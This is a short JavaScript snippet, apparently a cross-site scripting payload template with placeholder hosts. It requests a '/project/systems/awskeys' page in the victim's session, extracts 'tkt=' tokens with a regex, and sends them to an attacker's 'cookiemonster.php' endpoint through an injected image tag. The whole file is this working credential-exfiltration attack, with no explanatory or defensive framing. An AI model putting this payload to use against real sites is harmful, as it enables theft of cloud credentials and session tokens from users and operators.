const xhttp = new XMLHttpRequest();
// Retrieve information from another location
xhttp.open("GET", "https://__URL__/project/systems/awskeys", true);
xhttp.send();
xhttp.onload = function() {
	var req = new XMLHttpRequest();
	// Extract information using regex groups
	var tkn = xhttp.responseText.match(/tkt=\S*\"/g);
	if (tkn != null)
	{
		// send the info to cookiemonster
		s = document.createElement('img');
		s.src='https://__SERVER__/cookiemonster.php?cookie='+tkn;
		document.body.appendChild(s);
		console.log(tkn);
	}
}
